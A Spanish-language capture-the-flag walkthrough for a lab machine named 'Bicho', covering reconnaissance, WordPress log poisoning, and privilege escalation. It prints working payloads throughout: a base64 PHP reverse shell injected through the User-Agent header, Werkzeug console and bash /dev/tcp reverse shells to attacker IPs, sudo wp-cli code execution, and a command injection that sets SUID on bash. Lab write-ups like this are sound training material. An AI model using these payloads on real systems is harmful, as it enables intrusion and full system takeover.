- Tags: #Bicho
---
## Aprendizaje en Bicho
[Maquina Bicho](https://mega.nz/file/cC1lGQ4Y#4_ZBvE50GkqopyFr9i1ndugmsHiEnD7KA7PIEriSURI) -> Log Poisoning, Exploiting Werkzeug Debugger, Abusing wp-cli via Sudoers and Leveraging custom script in Sudoers for privilege escalation.

```bash
7z x bicho.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh bicho.tar # Desplegamos el laboratorio.
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux,
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # Realizamos escaneo de puertos
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # 
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** -> Tenemos un servico web expuesto. **( ubuntuNoble )**

### Fase Enumeracion Web:
```bash
172.17.0.2 bicho.dl # Aplicamos este cambio en nuestro ( /etc/hosts ) para poder acceder a la web
172.17.0.2 # Accedemos a la web

whatweb http://172.17.0.2 # Tenemos estas tecnologias que usa la web.
http://172.17.0.2 [302 Found] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], RedirectLocation[http://bicho.dl]
http://bicho.dl [200 OK] Apache[2.4.58], Bootstrap[0.8,6.6.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.7.1], MetaGenerator[WordPress 6.6.2], Script[text/javascript], Title[Visit Suazilandia 🇸🇿], UncommonHeaders[link], WordPress[6.6.2]
```

```bash
nmap -p80 --script http-enum 172.17.0.2 # Tenemos estos resultado

/wp-login.php: Possible admin folder
/readme.html: Wordpress version: 2 
/: WordPress version: 6.6.2
/wp-includes/images/rss.png: Wordpress version 2.2 found.
/wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
/wp-includes/images/blank.gif: Wordpress version 2.6 found.
/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
/wp-login.php: Wordpress login page.
/wp-admin/upgrade.php: Wordpress login page.
/readme.html: Interesting, a readme.
```

### Enumeracion WordPress:
```bash
wpscan --url http://bicho.dl
wpscan --url http://<URL> --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

**( bicho )** --> Tenemos un potencial usuario.

```bash
http://bicho.dl/wp-content/debug.log # Aqui se registran los logs que intentaremos envenenar 

http://bicho.dl/wp-login.php # Aqui es donde inyectaremos el payload el siguiente payload:
<?php echo `printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo= |base64 -d | bash`;?> # Payload
```


### Fase Intrusion:
```bash
POST /wp-login.php HTTP/1.1
Host: bicho.dl
User-Agent: <?php echo `printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQo= | base64 -d | bash`;?>
```

Nos ponemos en escucha por el puerto **4444** para recibir la conexion, y Mandamos la peticion

```bash
http://bicho.dl/wp-content/debug.log # Una ves mandado el payload recargamos la pagina.
```

### Fase Escalada Privilegios:
```bash
netstat -tuln # Muestra las conexiones de red en el sistema
```

Dado que el puerto 5000 (donde está corriendo una aplicación Flask) está abierto solo localmente en la máquina víctima, no podemos acceder directamente desde nuestra máquina atacante. Para solucionar este problema, vamos a utilizar la herramienta `chisel`, que nos permitirá crear un túnel seguro desde la máquina víctima hacia nuestra máquina atacante, redirigiendo el tráfico de ese puerto privado a un puerto accesible de nuestra máquina.

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz # Descargamos la herramienta.
7z x chisel_1.10.1_linux_amd64.gz # Descomprimimos el archivo
chmod +x chisel # Damos permiso de ejecucion
chisel server -p 1234 --reverse # Levantamos un servidor por el puerto 1234

```

```bash
python3 -m http.server 80 # Nos montamos un servidor python3 para que podamos descargar a la maquina del taraget, la herramienta.

wget http://192.168.100.24/chisel # Descargamos en la maquina la herramienta
chmod +x chise # Otorgamos permisos
./chisel client 172.17.0.1:1234 R:9000:127.0.0.1:5000 # Desde la maquina del target ejecutamos la herramiena para crear el tunel que permita que el servicio interno este disponible externamente desde el puerto 9000
```

**( http://127.0.0.1:9000/ )** --> Ahora podremos acceder al recurso que antes no estaba expuesto,

```bash
gobuster dir -u http://127.0.0.1:9000/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,css,js # Fuzzeando por extensiones encontramos

/console              (Status: 200) [Size: 1562] # Tenemos esta ruta
```

**( http://127.0.0.1:9000/console )** --> Tenemos una consola interactiva, Sabiendo que corre python por detras 

```bash
nc -nlvp 443 # Nos ponemos en esucha por este puerto

import os
os.system(bash -c "exec bash -i &>/dev/tcp/192.168.100.24/443 <&1") 
```

```bash
sudo -l

User app may run the following commands on 1d1e943f10a8:
    (wpuser) NOPASSWD: /usr/local/bin/wp
```

Para poder escalar a el usuario **wpuser** crearemos el el directorio **/tmp** un archivo bajo el nombre: **( reverShell )** que contendra las siguientes instrucciones:
```bash
nc -nlvp 444 # Nos podemos en escucha

bash -i >& /dev/tcp/172.17.0.1/444 0>&1 
```

```bash
sudo -u wpuser /usr/local/bin/wp --exec="system('bash -c /tmp/reverShell');" # Ahora obtendremos uns shell como este usuario

sudo -l

User wpuser may run the following commands on 1d1e943f10a8:
    (root) NOPASSWD: /opt/scripts/backup.sh # Tenemos una via potencial de elevar privilegios
```

```bash
sudo /opt/scripts/backup.sh; whoami # Vemos que podemos ejecutar comandos en el sistema exitosamente.
sudo -u root /opt/scripts/backup.sh "../../../tmp/adada ; chmod u+s /bin/bash;" # De esta manera logramos darle premisos SUID a la bash de root
```

```bash
bash -p # Logramos elevar privilegios.
```